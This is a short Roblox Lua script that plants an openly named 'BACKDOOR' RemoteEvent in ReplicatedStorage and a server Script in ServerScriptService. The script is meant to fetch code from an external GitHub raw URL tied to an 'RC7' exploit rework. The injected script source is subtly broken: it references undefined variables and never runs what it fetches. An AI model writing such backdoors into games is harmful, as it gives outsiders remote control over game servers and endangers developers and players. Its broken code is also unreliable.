local HttpService = game:GetService("HttpService")

local remoteof = Instance.new("RemoteEvent")
remoteof.Name = "XX__RC7__XX__REMOTE__BACKDOOR_cx"
remoteof.Parent = game:GetService("ReplicatedStorage")

local scrurl = "https://raw.githubusercontent.com/Oflice/Rc7-Rework/refs/heads/main/Files/Script.lua"

local Script = Instance.new("Script")
Script.Name = "XX__RC7__XX__SCRIPT_MAIN__BACKDOOR_cx"
Script.Parent = game:GetService("ServerScriptService")
Script.Source = [[
HttpService:GetAsync(scrurl)
]]
